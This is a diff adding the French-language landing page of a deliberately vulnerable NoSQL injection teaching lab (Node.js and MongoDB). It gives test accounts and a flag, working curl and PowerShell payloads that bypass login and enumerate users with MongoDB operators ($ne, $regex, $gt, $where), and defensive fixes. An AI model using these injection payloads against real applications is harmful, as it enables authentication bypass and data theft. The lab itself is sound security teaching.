@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NoSQL Injection Lab - DIABLE v3.0</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>🔓 NoSQL Injection Lab</h1>
+            <p class="subtitle">Projet DIABLE v3.0 - DSI ISFA 2025-2026</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="warning">
+            <strong>⚠️ Avertissement</strong>
+            Cette application contient des vulnérabilités intentionnelles à des fins pédagogiques. 
+            <strong>Ne JAMAIS déployer en production ou sur un réseau public.</strong>
+        </div>
+
+        <div class="section">
+            <h2>📚 Description</h2>
+            <p>
+                Ce lab démontre les vulnérabilités d'injection NoSQL dans une application Node.js + MongoDB.
+                L'application accepte des requêtes JSON non validées permettant l'injection d'opérateurs MongoDB
+                pour contourner l'authentification et extraire des données sensibles.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>🎯 Objectifs Pédagogiques</h2>
+            <ol>
+                <li>Comprendre comment les injections NoSQL fonctionnent</li>
+                <li>Identifier les points de vulnérabilité dans le code</li>
+                <li>Exploiter les opérateurs MongoDB ($ne, $gt, $regex, $where)</li>
+                <li>Apprendre à sécuriser les applications contre ces attaques</li>
+            </ol>
+        </div>
+
+        <div class="section">
+            <h2>🚀 Endpoints Disponibles</h2>
+            
+            <div class="endpoint">
+                <strong>POST /login</strong><br>
+                Authentification utilisateur (VULNÉRABLE)<br>
+                <code>{"username": "admin", "password": "Admin123!"}</code>
+            </div>
+
+            <div class="endpoint">
+                <strong>POST /search</strong><br>
+                Recherche d'utilisateurs (VULNÉRABLE)<br>
+                <code>{"username": "alice"}</code>
+            </div>
+
+            <div class="endpoint">
+                <strong>POST /advanced-search</strong><br>
+                Recherche avancée avec $where (CRITIQUE)<br>
+                <code>{"query": "this.username == 'admin'"}</code>
+            </div>
+
+            <div class="endpoint">
+                <strong>GET /users</strong><br>
+                Liste tous les utilisateurs (sans secrets)<br>
+                <code>GET http://localhost:3000/users</code>
+            </div>
+
+            <div class="endpoint">
+                <strong>GET /health</strong><br>
+                Health check endpoint (DIABLE standard)<br>
+                <code>GET http://localhost:3000/health</code>
+            </div>
+
+            <div class="endpoint">
+                <strong>POST /reset</strong><br>
+                Réinitialiser la base de données (DIABLE standard)<br>
+                <code>POST http://localhost:3000/reset</code>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>👥 Utilisateurs de Test</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>Rôle</th>
+                        <th>Secret</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>admin</td>
+                        <td>Admin123!</td>
+                        <td>admin</td>
+                        <td>FLAG{nosql_injection_master}</td>
+                    </tr>
+                    <tr>
+                        <td>alice</td>
+                        <td>alice2024</td>
+                        <td>user</td>
+                        <td>Couleur préférée</td>
+                    </tr>
+                    <tr>
+                        <td>bob</td>
+                        <td>bobsecure</td>
+                        <td>user</td>
+                        <td>Film préféré</td>
+                    </tr>
+                    <tr>
+                        <td>charlie</td>
+                        <td>charlie456</td>
+                        <td>moderator</td>
+                        <td>Hobby</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="section">
+            <h2>💡 Exemples d'Exploitation</h2>
+            
+            <h3>1. Bypass d'authentification avec $ne</h3>
+            <p>Objectif : Se connecter sans connaître le mot de passe</p>
+            <pre><code>curl -X POST http://localhost:3000/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$ne":null},"password":{"$ne":null}}'</code></pre>
+
+            <h3>2. Extraction ciblée avec $regex</h3>
+            <p>Objectif : Énumérer les utilisateurs par force brute</p>
+            <pre><code>curl -X POST http://localhost:3000/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$regex":"^a"},"password":{"$ne":null}}'</code></pre>
+
+            <h3>3. Opérateurs de comparaison</h3>
+            <p>Objectif : Trouver tous les utilisateurs avec $gt</p>
+            <pre><code>curl -X POST http://localhost:3000/search \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$gt":""}}'</code></pre>
+
+            <h3>4. JavaScript injection avec $where</h3>
+            <p>Objectif : Exécuter du code JavaScript arbitraire</p>
+            <pre><code>curl -X POST http://localhost:3000/advanced-search \
+  -H "Content-Type: application/json" \
+  -d '{"query":"this.username == '\''admin'\''"}'</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>🛡️ Comment se Protéger</h2>
+            
+            <h3>1. Validation stricte du type</h3>
+            <pre><code>if (typeof username !== 'string' || typeof password !== 'string') {
+  return res.status(400).json({ error: 'Invalid input type' });
+}</code></pre>
+
+            <h3>2. Utiliser un ORM/ODM (Mongoose)</h3>
+            <pre><code>const userSchema = new mongoose.Schema({
+  username: { type: String, required: true },
+  password: { type: String, required: true }
+}, { strict: true });</code></pre>
+
+            <h3>3. Sanitization avec express-mongo-sanitize</h3>
+            <pre><code>const mongoSanitize = require('express-mongo-sanitize');
+app.use(mongoSanitize());</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>📖 Commandes PowerShell</h2>
+            
+            <h3>Test normal login</h3>
+            <pre><code>Invoke-RestMethod -Uri http://localhost:3000/login -Method Post `
+  -ContentType "application/json" `
+  -Body '{"username":"admin","password":"Admin123!"}'</code></pre>
+
+            <h3>Test injection $ne</h3>
+            <pre><code>Invoke-RestMethod -Uri http://localhost:3000/login -Method Post `
+  -ContentType "application/json" `
+  -Body '{"username":{"$ne":null},"password":{"$ne":null}}'</code></pre>
+
+            <h3>Reset database</h3>
+            <pre><code>Invoke-RestMethod -Uri http://localhost:3000/reset -Method Post</code></pre>
+
+            <h3>Health check</h3>
+            <pre><code>Invoke-RestMethod -Uri http://localhost:3000/health -Method Get</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>📊 Informations Lab</h2>
+            <ul>
+                <li><strong>Tag:</strong> DB (Bases de données NoSQL)</li>
+                <li><strong>Difficulté:</strong> Moyen</li>
+                <li><strong>Technologie:</strong> Node.js 20 + MongoDB 7.0</li>
+                <li><strong>Port:</strong> 3000</li>
+                <li><strong>Endpoints:</strong> 6 (4 vulnérables, 2 standard DIABLE)</li>
+            </ul>
+        </div>
+
+        <footer>
+            <p>Lab développé pour le projet DIABLE v3.0 - DSI ISFA 2025-2026</p>
+            <p class="text-secondary">Vulnérabilités intentionnelles à des fins éducatives</p>
+        </footer>
+    </div>
+</body>
+</html>
